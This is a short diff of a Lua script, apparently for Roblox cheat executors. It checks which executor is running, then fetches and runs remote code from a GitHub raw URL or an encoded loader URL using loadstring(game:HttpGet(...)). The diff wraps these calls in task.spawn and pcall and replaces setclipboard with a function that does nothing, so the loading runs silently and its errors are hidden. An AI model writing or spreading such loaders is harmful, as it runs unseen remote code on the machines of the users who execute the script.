@@ -2,8 +2,18 @@ local executor = (identifyexecutor and string.lower(identifyexecutor())) or ""
 
 if executor:find("xeno") or executor:find("solara") then
 print("Shit executor")
+task.spawn(function()
+    pcall(function() 
+setclipboard = function() return end
     loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/heads/main/egors"))()
+    end)
+end)
 else
     print("Good executor")
+task.spawn(function()
+    pcall(function() 
+setclipboard = function() return end
 loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjY3MTBjOTYyLTcxOTItNDcxYi04ZjQyLWNmOWExYThjNGFiNSIsImtpbmQiOiJsb2FkZXIifQ"))()
+    end)
+end)
 end
